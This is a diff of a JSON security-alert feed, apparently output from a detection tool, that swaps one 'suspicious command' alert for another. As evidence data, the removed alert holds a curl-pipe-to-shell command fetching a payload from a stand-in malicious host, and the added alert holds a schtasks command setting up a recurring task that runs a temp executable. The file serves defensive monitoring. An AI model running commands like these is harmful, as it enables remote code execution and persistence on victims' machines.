@@ -1,15 +1,15 @@
 {
-  "generated_at": "2025-10-16T03:03:45.429937+00:00",
+  "generated_at": "2025-10-16T04:23:05.145005+00:00",
   "count": 1,
   "alerts": [
     {
-      "id": "alert-44171",
-      "timestamp": "2025-10-16T03:03:45.429918+00:00",
-      "summary": "MEDIUM confidence: Suspicious command observed from 185.243.25.12",
-      "confidence": "medium",
+      "id": "alert-69557",
+      "timestamp": "2025-10-16T04:23:05.144987+00:00",
+      "summary": "LOW confidence: Suspicious command observed from 185.243.25.12",
+      "confidence": "low",
       "evidence": {
         "process": "cmd.exe",
-        "command": "curl http://malicious.example/payload.sh | sh",
+        "command": "schtasks /create /sc minute /tn Updater /tr C:\\Windows\\temp\\p.exe",
         "source_ip": "185.243.25.12"
       }
     }
